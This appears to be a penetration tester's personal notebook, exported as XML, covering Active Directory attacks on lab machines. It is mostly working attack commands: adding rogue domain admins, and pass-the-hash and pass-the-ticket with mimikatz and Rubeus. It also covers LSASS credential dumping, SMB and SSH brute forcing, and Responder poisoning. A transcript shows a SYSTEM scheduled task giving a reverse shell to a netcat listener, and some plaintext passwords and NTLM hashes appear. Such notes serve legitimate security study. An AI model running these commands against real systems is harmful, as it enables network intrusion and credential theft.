          <rich_text link="webs https://github.com/GhostPack/Rubeus">Rubeus</rich_text>
          <rich_text> or </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz">mimikatz</rich_text>
          <rich_text>.
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text> 
 Ex:
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text> 
 or
 
 
 
where ptt is pass the ticket
 
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>then
 
 
 
 
 </rich_text>
          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
          <rich_text>
 
 </rich_text>
          <rich_text family="monospace">
</rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="37" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Set-ADAccountPassword sophie -Reset -NewPassword (Read-Host -AsSecureString -Prompt 'New Password') -Verbose</codebox>
          <codebox char_offset="606" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net user john1 pass123 /add /domain</codebox>
          <codebox char_offset="647" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net localgroup administrators john1 /add</codebox>
          <codebox char_offset="685" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net group "EXCHANGE WINDOWS PERMISSIONS" john1 /add</codebox>
          <codebox char_offset="697" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">net group "Exchange Windows Permissions" john1 /add /domain</codebox>
          <codebox char_offset="837" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Invoke-WebRequest http://10.10.10.100/GMSAPasswordReader.exe -OutFile GMSA.exe</codebox>
          <codebox char_offset="843" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
$wc = New-Object Net.WebClient
$wc.DownloadString("http://10.10.10.100  whatever else u want with space")
</codebox>
          <codebox char_offset="1205" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">gpupdate /force</codebox>
          <codebox char_offset="1327" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">Test-NetConnection -ComputerName YouComputerName -Port 389
or

# Test if HTTP port is open
Test-NetConnection google.com -CommonTCPPort "Http"

# Or define a port number
Test-NetConnection google.com -Port 80</codebox>
          <codebox char_offset="1411" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="dosbatch" highlight_brackets="1" show_line_numbers="0">runas /user:corp\server_admin "C:\Windows\system32\notepad.exe C:\ps\region.txt"

or  like ippsec writeup

runas /netonly /user:domain.local\user cmd
</codebox>
          <codebox char_offset="2196" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">.\Rubeus.exe asktgt /user:Administrator /rc4:b73fdfe10e87b4ca5c0d957f81de6863 /ptt</codebox>
          <codebox char_offset="2206" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">mimikatz # kerberos::ptt</codebox>
          <codebox char_offset="2251" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">Enter-PSSession -ComputerName dc01</codebox>
          <node name="Getting a Shell from password" unique_id="92" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688943845" ts_lastsave="1688943934">
            <rich_text scale="h2">First, let's restart out Netcat listener.</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text scale="h2">
&#13;Next, we'll spawn a new PowerShell session to install and run our scheduled task using the Administrator user's credentials.</rich_text>
            <rich_text>

&#13;</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <rich_text>
</rich_text>
            <rich_text scale="h2">&#13;Once we run the scheduled task (as shown in the final command above), we are presented with a full system shell.</rich_text>
            <rich_text>
</rich_text>
            <rich_text justification="left"></rich_text>
            <rich_text family="monospace">&#13;
</rich_text>
            <codebox char_offset="42" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;kali@kali:~$ sudo nc -lvp 445&#13;
listening on [any] 445 ...&#13;
</codebox>
            <codebox char_offset="172" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">c:\windows\system32\inetsrv&gt;powershell&#13;
powershell&#13;
Windows PowerShell &#13;
Copyright (C) Microsoft Corporation. All rights reserved.&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; $pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force&#13;
$pw = ConvertTo-SecureString "T4E@d8!/od@l36" -AsPlainText -Force&#13;
PS C:\windows\system32\inetsrv&gt;&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; $creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)&#13;
$creds = New-Object System.Management.Automation.PSCredential ("Administrator", $pw)&#13;
PS C:\windows\system32\inetsrv&gt;&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds&#13;
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /create /sc onstart /tn shell /tr C:\inetpub\wwwroot\shell.exe /ru SYSTEM } -Credential $creds&#13;
SUCCESS: The scheduled task "shell" has successfully been created.&#13;
PS C:\windows\system32\inetsrv&gt;&#13;
&#13;
PS C:\windows\system32\inetsrv&gt; Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds&#13;
Invoke-Command -Computer hutchdc -ScriptBlock { schtasks /run /tn shell } -Credential $creds&#13;
SUCCESS: Attempted to run the scheduled task "shell".&#13;
PS C:\windows\system32\inetsrv&gt;</codebox>
            <codebox char_offset="290" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&#13;kali@kali:~$ nc -lvp 445&#13;
listening on [any] 445 ...&#13;
192.168.120.108: inverse host lookup failed: Unknown host&#13;
connect to [192.168.118.6] from (UNKNOWN) [192.168.120.108] 49731&#13;
Microsoft Windows [Version 10.0.17763.1554]&#13;
(c) 2018 Microsoft Corporation. All rights reserved.&#13;
&#13;
C:\Windows\system32&gt;whoami&#13;
whoami&#13;
nt authority\system</codebox>
          </node>
        </node>
        <node name="CrackMapExec" unique_id="41" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687689718" ts_lastsave="1689888826">
          <rich_text scale="h3">Enumerating smb via crackmapexec</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


</rich_text>
          <rich_text scale="h3">Enumerating all the shares with a given password</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

 
</rich_text>
          <rich_text scale="h4"> Checking Pass the Hash</rich_text>
          <rich_text>
 
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
</rich_text>
          <rich_text scale="h3"> Listing all the shares</rich_text>
          <rich_text>
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <rich_text scale="h3">Null Authentication smb Enumeration</rich_text>
          <rich_text>

 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 


</rich_text>
          <rich_text scale="h3">Anonymous Authentication smb Enum</rich_text>
          <rich_text>
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
 
</rich_text>
          <rich_text scale="h3">  </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <rich_text scale="h2">Checking if winrm works</rich_text>
          <rich_text>


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

once confirmed simply run:
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
  
  
</rich_text>
          <rich_text scale="h2"> Adding Domain with -d</rich_text>
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text> 
</rich_text>
          <rich_text scale="h3"> Checking all the files in the share</rich_text>
          <rich_text>
 
 </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
 
</rich_text>
          <rich_text scale="h3"> checking usernames and passwords line by line (not using all the passwords for each user)</rich_text>
          <rich_text>
 
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


or chacking all the password and continuing on success:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

____________________________________________________________________-


Grabbing the Laps password

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

______________________________


</rich_text>
          <rich_text scale="h2">SSH Brute Force</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <codebox char_offset="34" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.100</codebox>
          <codebox char_offset="88" justification="left" frame_width="962" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.100 -u &lt;username&gt; -p &lt;password&gt; --shares

Ex:

crackmapexec smb 10.10.10.100 -u admin -p abcd1234 --shares</codebox>
          <codebox char_offset="120" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.100 -u admin -H reallybighashvalue</codebox>
          <codebox char_offset="150" justification="left" frame_width="610" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> crackmapexec smb 10.10.10.100 --shares
 </codebox>
          <codebox char_offset="190" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.100 --shares -u '' -p ''</codebox>
          <codebox char_offset="231" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.100 --shares -u 'randomanon' -p ''</codebox>
          <codebox char_offset="239" justification="left" frame_width="978" frame_height="100" width_in_pixels="1" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.100 -u admin -H reallybighashvalue</codebox>
          <codebox char_offset="267" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec winrm 10.10.10.100 -u users.txt -H hashes.txt</codebox>
          <codebox char_offset="297" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.100 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f808</codebox>
          <codebox char_offset="328" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> Crackmapexec -d domain.local -u username -p password --shares</codebox>
          <codebox char_offset="329" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">
</codebox>
          <codebox char_offset="372" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.100 -u validuser.txt -p password.txt -M spider-plus </codebox>
          <codebox char_offset="373" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"></codebox>
          <codebox char_offset="470" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">  crackmapexec smb 10.10.10.100  -u validuser.txt -p password.txt -M spider-plus --no-bruteforce</codebox>
          <codebox char_offset="531" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec smb 10.10.10.100  -u validuser.txt -p password.txt -M spider-plus --continue-on-success</codebox>
          <codebox char_offset="634" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ldap 10.10.10.100 -u &lt;username&gt; -p &lt;password&gt; --kdcHost 10.10.10.100 -M laps</codebox>
          <codebox char_offset="687" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">crackmapexec ssh 10.10.10.100 -u patrick -p /usr/share/wordlists/rockyou.txt</codebox>
        </node>
        <node name="Using Bloodhound" unique_id="44" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690408" ts_lastsave="1696645243">
          <rich_text scale="h3">Upload sharphound and run the following if u are on a non domain joined system in powershell</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

For Domain Joined simply run

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


Once Done download the zip file and upload it in bloodhound by dragging and dropping

First always check the pwned users and mark them owned before checking anything else


Once Done download the zip file and upload it in bloodhound by dragging and dropping

First always check the pwned users and mark them owned before checking anything else

____________________________________________________


using Powershell to run sharphound/bloodhound on target machine

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
_______________________________________________


</rich_text>
          <rich_text scale="h3">running bloodhound from attack machine using python</rich_text>
          <rich_text>

First install via
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

then


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

OR 

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>



where </rich_text>
          <rich_text family="monospace">ns</rich_text>
          <rich_text> is the name server aka dns

</rich_text>
          <rich_text scale="h3">To get more infor use:</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


where -c is for collection all


_________________________________________________________________________________________


</rich_text>
          <rich_text scale="h2">Running the console</rich_text>
          <rich_text>

To view all the json files generated by the commands above :

1.  Start bloodhound via : </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
   
2. Start neo4j console: </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
3.  Use Default password as neo4j/neo4j

4. Upload all the Json Files or drop the zip file

5. First always check the pwned users and mark them owned before checking anything else

6.Click on the left side and click on Analysis
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


7. Select : </rich_text>
          <rich_text weight="heavy">Shortest Paths to High Value Targets</rich_text>
          <rich_text>  see that view
 
8. Check the machine u have access to and see the shortest path. or path from owned users and select Domain Admin

9. click on the joining arrows, select help and then abuse to see how it can be achieved
   
</rich_text>
          <codebox char_offset="94" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe -c all -d domain.local --domaincontroller 10.10.10.100</codebox>
          <codebox char_offset="127" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="powershell" highlight_brackets="1" show_line_numbers="0">.\sharphound.exe</codebox>
          <codebox char_offset="596" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">upload SharpHound.ps1&#13;
Import-Module ./SharpHound.ps1&#13;
Invoke-Bloodhound -collectionmethod all -domain htb.local -ldapuser svc-alfresco -ldappass s3rvice</codebox>
          <codebox char_offset="719" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo apt install bloodhound.py</codebox>
          <codebox char_offset="729" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 10.10.10.100 -d support.htb -u ‘ldap’ -p ‘password’</codebox>
          <codebox char_offset="737" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -c all  -u 'svc-alfresco' -p 's3rvice' -ns 10.10.10.100 -d htb.local -gc forest.htb.local</codebox>
          <codebox char_offset="803" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">bloodhound-python --dns-tcp -ns 10.10.10.100 -d support.htb -u ‘ldap’ -p ‘password’ -c all</codebox>
          <codebox char_offset="1042" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo bloodhound</codebox>
          <codebox char_offset="1072" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo neo4j console</codebox>
          <encoded_png char_offset="1302" justification="left" link="webs https://juggernaut-sec.com/wp-content/uploads/2022/05/8442901667a85bf701cabc4f8b9d7d3e.png"></encoded_png>
        </node>
        <node name="ldapsearch" unique_id="45" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1687690428" ts_lastsave="1696109791">
          <rich_text scale="h3">Using Ldapsearch</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

or
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
or 

Without any user:

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


once u have the output make sure u check log file for 

1.  </rich_text>
          <rich_text weight="heavy">Passwords</rich_text>
          <rich_text> via :
   </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
2.  </rich_text>
          <rich_text weight="heavy">Usernames</rich_text>
          <rich_text> Via:
   </rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


_________________________________________________________________


</rich_text>
          <rich_text scale="h2">To check for admin</rich_text>
          <rich_text>

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>
</rich_text>
          <codebox char_offset="18" justification="left" frame_width="50" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -H ldap://10.10.10.100 -D ‘luser@support.htb’ -w 'password' -b 'dc=support,dc=htb'</codebox>
          <codebox char_offset="24" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -v -x -D &lt;user&gt;@HUTCH.OFFSEC -w &lt;password&gt; -b "DC=hutch,DC=offsec" -H ldap://10.10.10.100</codebox>
          <codebox char_offset="50" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0"> ldapsearch -x -b "dc=hutch,dc=offsec" -H ldap://10.10.10.100 | tee ldapSearch.log  </codebox>
          <codebox char_offset="133" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">cat ldapSearch.log| grep -i password</codebox>
          <codebox char_offset="157" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">grep 'sAMAccountName:' ldapSearch.log

or

grep 'userPrincipalName:' ldapsearch/ldapSearch_Guest.log   </codebox>
          <codebox char_offset="249" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">ldapsearch -v -x -D &lt;user&gt;@HUTCH.OFFSEC -w &lt;password&gt; -b "DC=hutch,DC=offsec" -H ldap://10.10.10.100 "(ms-MCS-AdmPwd=*)" ms-MCS-AdmPwd</codebox>
        </node>
        <node name="MIMIKATZ" unique_id="91" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1688334012" ts_lastsave="1688335156">
          <rich_text underline="single" weight="heavy">Mimikatz Commands:</rich_text>
          <rich_text>
&#13;&#13;• </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#logonpasswords">logonpasswords</rich_text>
          <rich_text>: </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::logonpasswords</rich_text>
          <rich_text>)&#13;&#13;◇ Extracts passwords in memory
&#13;
&#13;
&#13;• </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-sekurlsa#pth">pth</rich_text>
          <rich_text> (pass the hash):&#13;</rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::pth /user:Administrateur /domain:chocolate.local /ntlm:cc36cf7a8514893efccd332446158b1a</rich_text>
          <rich_text>&#13;&#13;◇ A fake identity is created and the faske identitt’s NTLM hash is replaced with the real one.
&#13;◇ “ntlm hash is mandatory on XP/2003/Vista/2008 and before 7/2008r2/8/2012 kb2871997 (AES not available or replaceable)”
&#13;◇ “AES keys can be replaced only on 8.1/2012r2 or 7/2008r2/8/2012 with kb2871997, in this case you can avoid ntlm hash.”
&#13;
&#13;
&#13;• ptt (pass the ticket):&#13;</rich_text>
          <rich_text family="monospace">mimikatz # kerberos::ptt</rich_text>
          <rich_text>&#13;&#13;◇ Enables Kerberos ticket (TGT or TGS) injection into the current session.
&#13;
&#13;
&#13;• tickets:  </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::tickets /export</rich_text>
          <rich_text>&#13;&#13;◇ Identifies all session Kerberos tickets and lists/exports them.
&#13;◇ sekurlsa pulls the Kerberos data from memory and can access all user session tickets on the computer.
&#13;
&#13;
&#13;• ekeys:  </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::ekeys</rich_text>
          <rich_text>&#13;&#13;◇ Extract the Kerberos ekeys from memory. Provides theft of a user &#13;account until the password is changed (which may be never for a &#13;Smartcard/PKI user).
&#13;
&#13;
&#13;• dpapi:  </rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::dpapi</rich_text>
          <rich_text>
&#13;• minidump:&#13;</rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::minidump lsass.dmp</rich_text>
          <rich_text>&#13;&#13;◇ Perform a minidump of the LSASS process and extract credential data &#13;from the lsass.dmp. A minidump can be saved off the computer for &#13;credential extraction later, but the major version of Windows must match&#13; (you can’t open the dump file from Windows 2012 on a Windows 2008 &#13;system).
&#13;
&#13;
&#13;• kerberos:&#13;</rich_text>
          <rich_text family="monospace">mimikatz # sekurlsa::kerberos</rich_text>
          <rich_text>&#13;&#13;◇ &#13; Extracts the smartcad/PIV PIN from memory (cached in LSASS when using a smartcard).&#13;
&#13;
&#13;
&#13;• </rich_text>
          <rich_text link="webs https://github.com/gentilkiwi/mimikatz/wiki/module-~-privilege">debug:</rich_text>
          <rich_text>&#13;mimikatz # privilege::debug&#13;&#13;◇ Sets debug mode for current mimikatz session enabling LSASS access.
&#13;
&#13;
&#13;• </rich_text>
          <rich_text link="webs https://translate.googleusercontent.com/translate_c?depth=1&amp;hl=en&amp;ie=UTF8&amp;prev=_t&amp;rurl=translate.google.com&amp;sl=fr&amp;tl=en&amp;u=http://blog.gentilkiwi.com/securite/mscache-v2-dcc2-iteration&amp;usg=ALkJrhjpLNpxdAk-QbYsP-iApIcsLGHdWA">lsadump cache</rich_text>
          <rich_text>: (requires token::elevate to be SYSTEM)&#13;mimikatz # lsadump::cache&#13;&#13;◇ Dumps cached Windows domain credentials from HKEY_LOCAL_MACHINE\SECURITY\Cache (accessible SYSTEM).

</rich_text>
          <rich_text link="webs https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/">https://blog.netwrix.com/2021/11/30/passing-the-hash-with-mimikatz/</rich_text>
          <rich_text>
&#13;
&#13;
&#13;
</rich_text>
        </node>
        <node name="Responder" unique_id="93" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689197133" ts_lastsave="1689283651">
          <rich_text scale="h1">
LLMNR/NBT-NS/mDNS Poisoner


</rich_text>
          <rich_text scale="h2">Basic Usage:</rich_text>
          <rich_text>

Run:

sudo responder -I tun0
or 


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


or


</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


And then made victim perform actions (send queries via ssrf) to posion
When a client tries to resolve a name not in the DNS, Responder will poison the LLMNR (Link-Local Multicast Name Resolution), NBT-NS (NetBIOS Name Service) and spoof SMB Request in order to grab NetNTLMv2 hash.

Reference:
</rich_text>
          <rich_text link="webs https://juggernaut-sec.com/llmnr-poisoning-responder/">https://juggernaut-sec.com/llmnr-poisoning-responder/</rich_text>
          <codebox char_offset="79" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo responder -I tun0 -wv</codebox>
          <codebox char_offset="88" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">sudo responder -I tun0 -wvfr</codebox>
        </node>
        <node name="Remote Shells for Windows" unique_id="94" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689198163" ts_lastsave="1689286554">
          <rich_text>

</rich_text>
          <rich_text link="node 86">psexec - Passthe HAsh</rich_text>
          <rich_text>


</rich_text>
          <rich_text link="node 95">evilwinrm</rich_text>
          <rich_text>
</rich_text>
        </node>
        <node name="evilwinrm" unique_id="95" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1689286530" ts_lastsave="1690067048">
          <rich_text>
</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

or

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>


where u make sure the hash is the second part of  the hash:

ex: 

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>



</rich_text>
          <rich_text scale="h2">Option</rich_text>
          <rich_text>


If u want to run a file on ur local kali linux directly use `-s`  option followed by  `directory location`

</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text>

now if u have PowerView.ps1 on ur local kali/attacker machine u can run it directly on windows system


References:
1. </rich_text>
          <rich_text link="webs https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/">https://www.hackingarticles.in/a-detailed-guide-on-evil-winrm/</rich_text>
          <rich_text>
2. </rich_text>
          <rich_text link="webs https://github.com/Hackplayers/evil-winrm">https://github.com/Hackplayers/evil-winrm</rich_text>
          <codebox char_offset="1" justification="left" frame_width="28" frame_height="8" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -u '&lt;user&gt;' -p &lt;password&gt; -i 10.10.10.100</codebox>
          <codebox char_offset="8" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.100 -u L.Livingstone -H 19a3a7550ce8c505c2d46b5e39d6f8</codebox>
          <codebox char_offset="79" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">&lt;hash not to use&gt;:&lt;hash to actually use&gt;</codebox>
          <codebox char_offset="201" justification="left" frame_width="84" frame_height="10" width_in_pixels="0" syntax_highlighting="sh" highlight_brackets="1" show_line_numbers="0">evil-winrm -i 10.10.10.100 -u anirudh -p "SecureHM" -s .</codebox>
        </node>
        <node name="URI File Attack" unique_id="98" prog_lang="custom-colors" tags="" readonly="0" nosearch_me="0" nosearch_ch="0" custom_icon_id="0" is_bold="0" foreground="" ts_creation="1690061701" ts_lastsave="1690061750">
          <rich_text>
</rich_text>
          <rich_text scale="h2">URI File Attack</rich_text>
          <rich_text>
&#13;As this is a Windows host, we can use the SMB share access&#13;  to upload a file that the target system will interpret as a Windows &#13; shortcut. In this file, we can specify an icon that points to our Kali &#13; host. This should allow us to capture the user's NTLM hash when it is &#13; accessed.
&#13;We'll create a file named @hax.url with the following contents.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
&#13;When a user accesses this file, it will attempt to load &#13; the icon. This will cause a request to our Kali host for a file named &#13; with the user account's username. This request should also contain the &#13; NTLM hash of this account.
&#13;Before uploading the file to the SMB share, let's start responder to listen for the request.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
&#13;Next, let's upload our file.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
&#13;Nice, we successfully obtained the NTLM hash for a user named anirudh.&#13; User Password Brute-Force
&#13;Let's save this hash to a file and attempt to crack it using john and the rockyou.txt wordlist.
&#13;</rich_text>
          <rich_text justification="left"></rich_text>
          <rich_text family="monospace">&#13;
</rich_text>
          <rich_text>
</rich_text>
